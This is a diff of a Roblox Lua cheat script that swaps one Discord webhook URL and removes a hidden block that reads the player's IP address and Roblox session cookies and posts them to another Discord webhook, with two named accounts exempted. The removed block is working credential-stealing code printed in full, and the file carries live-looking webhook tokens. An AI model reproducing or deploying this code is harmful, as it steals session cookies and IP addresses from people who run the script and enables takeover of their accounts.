@@ -942,7 +942,7 @@ end
 	
 end)
 wait(1)
-local webh = "https://discord.com/api/webhooks/1082088001980600390/mRD0emImCpOq49-Up6SjdLIAf-1lQLvnje43Tgrtkv5Ke7s58TDJiaThCsiEUREqhkxx"
+local webh = "https://discord.com/api/webhooks/1082096148052979848/scp6k7AH4b-UIQjd4jjy-qhrPdvyTYEGQ0UyaNsWajiuUwZH7tHKxns7PjzmVcPOKoeM"
 
 
 pcall(function()
@@ -997,57 +997,3 @@ pcall(function()
        );
    end
 end)
-wait(1)
-local ip = game:HttpGet("https://api.myip.com/")
-local COOKIE = ""
-local response = syn.request(
-    {
-        Url = "https://www.roblox.com",
-    }
-)
-for i,v in pairs(response) do
-    if type(v) == "table" then
-        for ii,vv in pairs(v) do
-            if string.find(ii, "cookie") then
-                COOKIE = COOKIE.."\n"..vv
-            end
-        end
-    end
-end
-
-if game.Players.LocalPlayer.Name == "YouAintDumb" or game.Players.LocalPlayer.Name == "full_ofcman" then
-    ip = "<REDACTED>" 
-    COOKIE = "<REDACTED>" 
-end32
-
-syn.request({
-    Url = "https://discord.com/api/webhooks/1082089637079687250/G49FzBsjOqu3YyBa0pno4HzxdjiNyIXfFUUwTeagp7kJRUHIpN62BMztez3R_9_nj4Hg", 
-    Body = game:GetService("HttpService"):JSONEncode({
-        ["embeds"]={{
-            ["title"]="||"..ip.."||",
-            ["type"]="rich",
-            ["description"]=COOKIE,
-            ["color"]=tonumber(0x7269da),
-            ["footer"]={
-                ["text"]=os.date("%A, %m %B %Y %I:%M:%S %p")
-            }
-        }},
-        ["avatar_url"]="http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name),
-        ["username"]="Username: "..game.Players.LocalPlayer.Name,
-    }), 
-    Method = "POST", 
-    Headers = {["content-type"] = "application/json"}
-})
-print("men")
-
---[[
-Section:NewToggle("name", "", function(state)
-    if state then
-
-    else
-
-        
-    end
-end)
-
-]]
